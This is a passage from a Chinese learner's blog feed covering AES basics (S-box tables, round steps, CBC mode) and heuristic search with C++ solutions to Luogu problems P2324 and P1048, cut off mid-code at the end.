title="AES常见分类"></a>AES常见分类</h2><p>AES有三种常见加密标准，根据密钥位数不同用于区分，密钥的长度不同，推荐加密轮数也不同，如下表所示：</p><table><thead><tr><th>AES</th><th>密钥长度（字节)</th><th>分组长度(字节)</th><th>加密轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>16</td><td>16</td><td>10</td></tr><tr><td>AES-192</td><td>24</td><td>16</td><td>12</td></tr><tr><td>AES-256</td><td>32</td><td>16</td><td>14</td></tr></tbody></table><p>AES还有五种加密模式：1.电码本模式（Electronic Codebook Book (ECB)）；2.密码分组链接模式（Cipher Block Chaining (CBC)）；3.计算器模式（Counter (CTR)）；4.密码反馈模式（Cipher FeedBack (CFB)）；5.输出反馈模式（Output FeedBack (OFB)）。</p><p>本片博客只介绍前两种模式。</p><h1 id="AES加密流程"><a href="#AES加密流程" class="headerlink" title="AES加密流程"></a>AES加密流程</h1><p>AES的EBC模式大概可以用下面的流程图图表示</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/2.png" alt="2"></p><h2 id="字节替换"><a href="#字节替换" class="headerlink" title="字节替换"></a>字节替换</h2><p>官方的解释是，建立16*16的字节表，然后把自己拆成高4位和低四位，高四位位行，第四位为列好去查表替换。这个很好理解，其实就是在0x00-0xff字节内建立双射，让每个字节替换为其它字节。比如最简单的，我让所有字节都加1%256，也是一个双射变换。那么既然是一个双射，那么我们很容易求出它的逆。</p><p>一般AES加密用以下的字节替换表</p><table><thead><tr><th>行/列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x63</td><td>0x7c</td><td>0x77</td><td>0x7b</td><td>0xf2</td><td>0x6b</td><td>0x6f</td><td>0xc5</td><td>0x30</td><td>0x01</td><td>0x67</td><td>0x2b</td><td>0xfe</td><td>0xd7</td><td>0xab</td><td>0x76</td></tr><tr><td>1</td><td>0xca</td><td>0x82</td><td>0xc9</td><td>0x7d</td><td>0xfa</td><td>0x59</td><td>0x47</td><td>0xf0</td><td>0xad</td><td>0xd4</td><td>0xa2</td><td>0xaf</td><td>0x9c</td><td>0xa4</td><td>0x72</td><td>0xc0</td></tr><tr><td>2</td><td>0xb7</td><td>0xfd</td><td>0x93</td><td>0x26</td><td>0x36</td><td>0x3f</td><td>0xf7</td><td>0xcc</td><td>0x34</td><td>0xa5</td><td>0xe5</td><td>0xf1</td><td>0x71</td><td>0xd8</td><td>0x31</td><td>0x15</td></tr><tr><td>3</td><td>0x04</td><td>0xc7</td><td>0x23</td><td>0xc3</td><td>0x18</td><td>0x96</td><td>0x05</td><td>0x9a</td><td>0x07</td><td>0x12</td><td>0x80</td><td>0xe2</td><td>0xeb</td><td>0x27</td><td>0xb2</td><td>0x75</td></tr><tr><td>4</td><td>0x09</td><td>0x83</td><td>0x2c</td><td>0x1a</td><td>0x1b</td><td>0x6e</td><td>0x5a</td><td>0xa0</td><td>0x52</td><td>0x3b</td><td>0xd6</td><td>0xb3</td><td>0x29</td><td>0xe3</td><td>0x2f</td><td>0x84</td></tr><tr><td>5</td><td>0x53</td><td>0xd1</td><td>0x00</td><td>0xed</td><td>0x20</td><td>0xfc</td><td>0xb1</td><td>0x5b</td><td>0x6a</td><td>0xcb</td><td>0xbe</td><td>0x39</td><td>0x4a</td><td>0x4c</td><td>0x58</td><td>0xcf</td></tr><tr><td>6</td><td>0xd0</td><td>0xef</td><td>0xaa</td><td>0xfb</td><td>0x43</td><td>0x4d</td><td>0x33</td><td>0x85</td><td>0x45</td><td>0xf9</td><td>0x02</td><td>0x7f</td><td>0x50</td><td>0x3c</td><td>0x9f</td><td>0xa8</td></tr><tr><td>7</td><td>0x51</td><td>0xa3</td><td>0x40</td><td>0x8f</td><td>0x92</td><td>0x9d</td><td>0x38</td><td>0xf5</td><td>0xbc</td><td>0xb6</td><td>0xda</td><td>0x21</td><td>0x10</td><td>0xff</td><td>0xf3</td><td>0xd2</td></tr><tr><td>8</td><td>0xcd</td><td>0x0c</td><td>0x13</td><td>0xec</td><td>0x5f</td><td>0x97</td><td>0x44</td><td>0x17</td><td>0xc4</td><td>0xa7</td><td>0x7e</td><td>0x3d</td><td>0x64</td><td>0x5d</td><td>0x19</td><td>0x73</td></tr><tr><td>9</td><td>0x60</td><td>0x81</td><td>0x4f</td><td>0xdc</td><td>0x22</td><td>0x2a</td><td>0x90</td><td>0x88</td><td>0x46</td><td>0xee</td><td>0xb8</td><td>0x14</td><td>0xde</td><td>0x5e</td><td>0x0b</td><td>0xdb</td></tr><tr><td>A</td><td>0xe0</td><td>0x32</td><td>0x3a</td><td>0x0a</td><td>0x49</td><td>0x06</td><td>0x24</td><td>0x5c</td><td>0xc2</td><td>0xd3</td><td>0xac</td><td>0x62</td><td>0x91</td><td>0x95</td><td>0xe4</td><td>0x79</td></tr><tr><td>B</td><td>0xe7</td><td>0xc8</td><td>0x37</td><td>0x6d</td><td>0x8d</td><td>0xd5</td><td>0x4e</td><td>0xa9</td><td>0x6c</td><td>0x56</td><td>0xf4</td><td>0xea</td><td>0x65</td><td>0x7a</td><td>0xae</td><td>0x08</td></tr><tr><td>C</td><td>0xba</td><td>0x78</td><td>0x25</td><td>0x2e</td><td>0x1c</td><td>0xa6</td><td>0xb4</td><td>0xc6</td><td>0xe8</td><td>0xdd</td><td>0x74</td><td>0x1f</td><td>0x4b</td><td>0xbd</td><td>0x8b</td><td>0x8a</td></tr><tr><td>D</td><td>0x70</td><td>0x3e</td><td>0xb5</td><td>0x66</td><td>0x48</td><td>0x03</td><td>0xf6</td><td>0x0e</td><td>0x61</td><td>0x35</td><td>0x57</td><td>0xb9</td><td>0x86</td><td>0xc1</td><td>0x1d</td><td>0x9e</td></tr><tr><td>E</td><td>0xe1</td><td>0xf8</td><td>0x98</td><td>0x11</td><td>0x69</td><td>0xd9</td><td>0x8e</td><td>0x94</td><td>0x9b</td><td>0x1e</td><td>0x87</td><td>0xe9</td><td>0xce</td><td>0x55</td><td>0x28</td><td>0xdf</td></tr><tr><td>F</td><td>0x8c</td><td>0xa1</td><td>0x89</td><td>0x0d</td><td>0xbf</td><td>0xe6</td><td>0x42</td><td>0x68</td><td>0x41</td><td>0x99</td><td>0x2d</td><td>0x0f</td><td>0xb0</td><td>0x54</td><td>0xbb</td><td>0x16</td></tr></tbody></table><p>那么它的逆表就是</p><table><thead><tr><th>行/列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x52</td><td>0x09</td><td>0x6a</td><td>0xd5</td><td>0x30</td><td>0x36</td><td>0xa5</td><td>0x38</td><td>0xbf</td><td>0x40</td><td>0xa3</td><td>0x9e</td><td>0x81</td><td>0xf3</td><td>0xd7</td><td>0xfb</td></tr><tr><td>1</td><td>0x7c</td><td>0xe3</td><td>0x39</td><td>0x82</td><td>0x9b</td><td>0x2f</td><td>0xff</td><td>0x87</td><td>0x34</td><td>0x8e</td><td>0x43</td><td>0x44</td><td>0xc4</td><td>0xde</td><td>0xe9</td><td>0xcb</td></tr><tr><td>2</td><td>0x54</td><td>0x7b</td><td>0x94</td><td>0x32</td><td>0xa6</td><td>0xc2</td><td>0x23</td><td>0x3d</td><td>0xee</td><td>0x4c</td><td>0x95</td><td>0x0b</td><td>0x42</td><td>0xfa</td><td>0xc3</td><td>0x4e</td></tr><tr><td>3</td><td>0x08</td><td>0x2e</td><td>0xa1</td><td>0x66</td><td>0x28</td><td>0xd9</td><td>0x24</td><td>0xb2</td><td>0x76</td><td>0x5b</td><td>0xa2</td><td>0x49</td><td>0x6d</td><td>0x8b</td><td>0xd1</td><td>0x25</td></tr><tr><td>4</td><td>0x72</td><td>0xf8</td><td>0xf6</td><td>0x64</td><td>0x86</td><td>0x68</td><td>0x98</td><td>0x16</td><td>0xd4</td><td>0xa4</td><td>0x5c</td><td>0xcc</td><td>0x5d</td><td>0x65</td><td>0xb6</td><td>0x92</td></tr><tr><td>5</td><td>0x6c</td><td>0x70</td><td>0x48</td><td>0x50</td><td>0xfd</td><td>0xed</td><td>0xb9</td><td>0xda</td><td>0x5e</td><td>0x15</td><td>0x46</td><td>0x57</td><td>0xa7</td><td>0x8d</td><td>0x9d</td><td>0x84</td></tr><tr><td>6</td><td>0x90</td><td>0xd8</td><td>0xab</td><td>0x00</td><td>0x8c</td><td>0xbc</td><td>0xd3</td><td>0x0a</td><td>0xf7</td><td>0xe4</td><td>0x58</td><td>0x05</td><td>0xb8</td><td>0xb3</td><td>0x45</td><td>0x06</td></tr><tr><td>7</td><td>0xd0</td><td>0x2c</td><td>0x1e</td><td>0x8f</td><td>0xca</td><td>0x3f</td><td>0x0f</td><td>0x02</td><td>0xc1</td><td>0xaf</td><td>0xbd</td><td>0x03</td><td>0x01</td><td>0x13</td><td>0x8a</td><td>0x6b</td></tr><tr><td>8</td><td>0x3a</td><td>0x91</td><td>0x11</td><td>0x41</td><td>0x4f</td><td>0x67</td><td>0xdc</td><td>0xea</td><td>0x97</td><td>0xf2</td><td>0xcf</td><td>0xce</td><td>0xf0</td><td>0xb4</td><td>0xe6</td><td>0x73</td></tr><tr><td>9</td><td>0x96</td><td>0xac</td><td>0x74</td><td>0x22</td><td>0xe7</td><td>0xad</td><td>0x35</td><td>0x85</td><td>0xe2</td><td>0xf9</td><td>0x37</td><td>0xe8</td><td>0x1c</td><td>0x75</td><td>0xdf</td><td>0x6e</td></tr><tr><td>A</td><td>0x47</td><td>0xf1</td><td>0x1a</td><td>0x71</td><td>0x1d</td><td>0x29</td><td>0xc5</td><td>0x89</td><td>0x6f</td><td>0xb7</td><td>0x62</td><td>0x0e</td><td>0xaa</td><td>0x18</td><td>0xbe</td><td>0x1b</td></tr><tr><td>B</td><td>0xfc</td><td>0x56</td><td>0x3e</td><td>0x4b</td><td>0xc6</td><td>0xd2</td><td>0x79</td><td>0x20</td><td>0x9a</td><td>0xdb</td><td>0xc0</td><td>0xfe</td><td>0x78</td><td>0xcd</td><td>0x5a</td><td>0xf4</td></tr><tr><td>C</td><td>0x1f</td><td>0xdd</td><td>0xa8</td><td>0x33</td><td>0x88</td><td>0x07</td><td>0xc7</td><td>0x31</td><td>0xb1</td><td>0x12</td><td>0x10</td><td>0x59</td><td>0x27</td><td>0x80</td><td>0xec</td><td>0x5f</td></tr><tr><td>D</td><td>0x60</td><td>0x51</td><td>0x7f</td><td>0xa9</td><td>0x19</td><td>0xb5</td><td>0x4a</td><td>0x0d</td><td>0x2d</td><td>0xe5</td><td>0x7a</td><td>0x9f</td><td>0x93</td><td>0xc9</td><td>0x9c</td><td>0xef</td></tr><tr><td>E</td><td>0xa0</td><td>0xe0</td><td>0x3b</td><td>0x4d</td><td>0xae</td><td>0x2a</td><td>0xf5</td><td>0xb0</td><td>0xc8</td><td>0xeb</td><td>0xbb</td><td>0x3c</td><td>0x83</td><td>0x53</td><td>0x99</td><td>0x61</td></tr><tr><td>F</td><td>0x17</td><td>0x2b</td><td>0x04</td><td>0x7e</td><td>0xba</td><td>0x77</td><td>0xd6</td><td>0x26</td><td>0xe1</td><td>0x69</td><td>0x14</td><td>0x63</td><td>0x55</td><td>0x21</td><td>0x0c</td><td>0x7d</td></tr></tbody></table><p>比如在第一个表中可以看到0行0列是0x63，与之对应的，在第二张表的第6行第三列就是0x00，也就是0x63在第一个表中的位置。因为AES是对称加密，所以每一步操作都需要可逆。</p><h2 id="行位移"><a href="#行位移" class="headerlink" title="行位移"></a>行位移</h2><p>这里要说一下，AES分组是16个字节一组，在加密的过程中16字节会形成4x4的矩阵，字节按照以下顺序排列</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/3.png" alt="3"></p><p>行移位是一个简单的左循环移位操作。第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节，如下图所示：</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/4.png" alt="4"></p><p>逆变换当然也很简单，就不细讲了。</p><h2 id="列混淆"><a href="#列混淆" class="headerlink" title="列混淆"></a>列混淆</h2><p>这个涉及到的知识比较多，我有点难以接受，mark一下，以后再补</p><p>就是说把它当成一个矩阵然后和另一个矩阵做乘法运算得到新的矩阵，至于逆过程就是对逆矩阵做乘法。然后这里面的加法就是异或，乘法会变成取模乘法。(应该是这样的)</p><h2 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h2><p>这个很简单，就是扩展密钥，密钥输入了16字节，每组四个字节就是四组，第一组和第四组异或得到第五组，第二组和第五组异或得到第六组，第三组和第六组异或得到第七组，以此类推。因为要加密10次，所以扩展出四十组密钥。</p><p>然后就是很简单的了，列混淆得到的矩阵再和密钥异或一下即可。每次都和不一样的密钥做异或，一共十次，这就是AES。</p><h1 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h1><p>分组加密有一个缺点，分组之间独立，一样的数据不管在第几组都是一样的加密，如果我已只很多密文明文对，那么加密的信息很可能会被暴力破解出来，CBC就是用来对抗这个缺点的。CBC不通的就是，会有一个初始向量与第一组的数据进行异或，然后第二组的会和第一组异或加密前的数据异或再进行加密，以此类推，这样的话，分组之间将不再独立，改动前面的一个字节很可能导致整个密文发生巨大变化。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>启发式搜索算法进阶</title>
      <link href="/2021/12/16/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E8%BF%9B%E9%98%B6/"/>
      <url>/2021/12/16/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<p>继续来学启发式搜索</p><span id="more"></span><p>多的其实没啥好讲了的，因为概念问题在前一篇博文已经讲的很清楚了。主要就是训练寻找估值函数，多点题目练习能应对不通场景下的启发式搜索。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>洛谷上的<a href="https://www.luogu.com.cn/problem/P2324">p2324骑士精神</a></p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="https://cdn.luogu.com.cn/upload/pic/1389.png" alt="1"></p><p>主要就是说有个空格，然后所有马都走日，没有马脚，只能跳到空格里面去，然后问你是否能在15步以内达到。如果可以则输出最短步数，否则输出-1，因为空格只有一个我们不考虑跳马，考虑跳空格。</p><p>递归最大深度15层能确定了，但是任意一个状态可以延伸出最少2中最多八种情况。15作为指数时间上还是遭不住，考虑启发式搜索。那么估值函数需要怎么写呢？</p><h3 id="估值函数"><a href="#估值函数" class="headerlink" title="估值函数"></a>估值函数</h3><p>这里再补充点估值函数的知识。</p><p><em>f</em>(<em>n</em>)=<em>g</em>(<em>n</em>)+<em>h</em>(<em>n</em>)</p><p>估值函数一般表达式如上，g(n)为当前状态，h(n)为未来最优状态产生的花费，或者是其它。估值函数为两者和，由于当前状态我们很容易获取，所以算出未来最优状态即可等于获得了估值函数。可能前面讲的有点小问题，但是还是不妨碍的，因为我们平时写也基本是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">f</span>(n)+value&gt;ans)&#123;</span><br><span class="line">    <span class="built_in">dfs</span>(n+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以问题不大。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>在本题中，我们的估值函数应该是算能到达目的状态的最小步数。那么这个怎么去考虑呢，其实可以拿当前状态与目标状态相比较，如果有两个点不符合目标状态，那么它们最优能达成目标状态一定是1，这里的最优指的是所有的这个情况下能达成目的状态的最小值。因为如果两个不符合的点不形成“日”字的关系，那么它们可能就不止需要1步了，但是估值并不是真的去计算真正的实际情况，估值函数需要尽可能的方便计算，这点很重要。</p><p>那么如果我们有三个点不一样那情况如何呢？那考虑最好的情况那还得是2步解决。所以我们很容易可以发现，假如当前状态与目标状态有n个点不一样，那么它最少需要n-1步来完成。</p><p>所以我们很容易可以写出估值函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        tot+=!!(qipan[i/<span class="number">5</span>][i%<span class="number">5</span>]^goal[i/<span class="number">5</span>][i%<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当估值函数返回-1的时候说明当前已经符合目标状态了，那么这个将作为搜索终止条件，并更新最优解。</p><p>剩下的就是终归中距的dfs了。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> goal[<span class="number">5</span>][<span class="number">5</span>]=&#123;</span><br><span class="line">    <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> qipan[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">-2</span>,<span class="number">-2</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>&#125;,dy[]=&#123;<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-1</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        tot+=!!(qipan[i/<span class="number">5</span>][i%<span class="number">5</span>]^goal[i/<span class="number">5</span>][i%<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> step)</span></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;1&quot;);</span></span><br><span class="line">    <span class="keyword">if</span>(step&gt;<span class="number">15</span>)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">f</span>())&#123;</span><br><span class="line">        ans=<span class="built_in">min</span>(ans,step);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> new_x=x+dx[i],new_y=y+dy[i];</span><br><span class="line">        <span class="keyword">if</span>(new_x&lt;<span class="number">0</span>||new_x&gt;=<span class="number">5</span>||new_y&lt;<span class="number">0</span>||new_y&gt;=<span class="number">5</span>)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">swap</span>(qipan[new_y][new_x],qipan[y][x]);</span><br><span class="line">        <span class="keyword">if</span>(step+<span class="built_in">f</span>()&lt;=<span class="built_in">min</span>(ans,<span class="number">15</span>))&#123;</span><br><span class="line">            <span class="built_in">search</span>(new_x,new_y,step+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">swap</span>(qipan[new_y][new_x],qipan[y][x]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">int</span> start_x,start_y;</span><br><span class="line">    ans=<span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">            <span class="built_in"><span class="keyword">switch</span></span>(s[j])&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                    ;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                    qipan[i][j]=s[j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                    qipan[i][j]=<span class="number">2</span>;</span><br><span class="line">                    start_x=j;</span><br><span class="line">                    start_y=i;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    ;</span><br><span class="line">                    <span class="built_in">perror</span>(<span class="string">&quot;input error&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">search</span>(start_x,start_y,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ans==<span class="number">0x7fffffff</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好像不开氧气优化会被卡掉，我只能%氧气优化了，因为我实在不知道咋优化了。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> algorithm </category>
          
          <category> search </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>启发式搜索算法</title>
      <link href="/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/"/>
      <url>/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>来快乐学算法了。</p><span id="more"></span><h2 id="启发式搜索"><a href="#启发式搜索" class="headerlink" title="启发式搜索"></a>启发式搜索</h2><p>启发式搜索（英文：heuristic search）是一种改进的搜索算法。它在普通搜索算法的基础上引入了启发式函数，该函数的作用是基于已有的信息对搜索的每一个分支选择都做估价，进而选择分支。简单来说，启发式搜索就是对取和不取都做分析，从中选取更优解或删去无效解。</p><p>在此之前，本蒟蒻一直就只会dfs和bfs，今天来学学新的搜索算法。经过多重资料的 查阅也是大概得知启发式搜索的大概思路，每次搜索会对之后可能的最优状态估值，如果估出来的值不如当前某些状态，那么我就直接舍弃这个状态。就比如经典01背包问题，我对每一个物品的抉择都有选或者不选两种选择，我发现我不选这个物品，选其它物品所产生的最优解不如我当前选这个解的状态好，那么我直接考虑选择这个而不去搜索不选择这个物品的状态。</p><h3 id="估值函数"><a href="#估值函数" class="headerlink" title="估值函数"></a>估值函数</h3><p>这里需要解释一下我如何判断当前状态是否优于之后的最优状态，那么这里需要这么一个估值函数，估值函数不是真的对那个情况做具体分析，那样的话跟暴力没区别了。我这样考虑，如果剩下所有物品全能放进去都不如我一个放进去价值大，那么我肯定得放这个物品(前提是放得进去，放不进去就别讨论了)。那么这个剩下的所有物品的价值就是我这一个启发式搜索方案的估值函数。</p><p>假如有n样物品，那么在搜索第x样物品的估值函数就是</p><p>$f(x)=\sum _{i=x} ^{n} a[i]$</p><p>我在判断一下这个要不要放的时候我只需要看看我历史最优值是否小于当前最优值+估值函数值就可以了，如果成立那就说明这个可能可以不放，否则这个必须要放，因为如果不放的话，它剩下就算全放都没有我历史搜索出来的最优值大，那么我就没必要搜索不放的情况了。当然这是其中一种启发式搜索的办法。还有其它的方式，我们下面讲。</p><h2 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h2><p>来自洛谷<a href="https://www.luogu.com.cn/problem/P1048">P1048 NOIP2005 普及组 采药</a></p><p>那么我按照我之前的启发式搜索方式得到了下面的算法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span 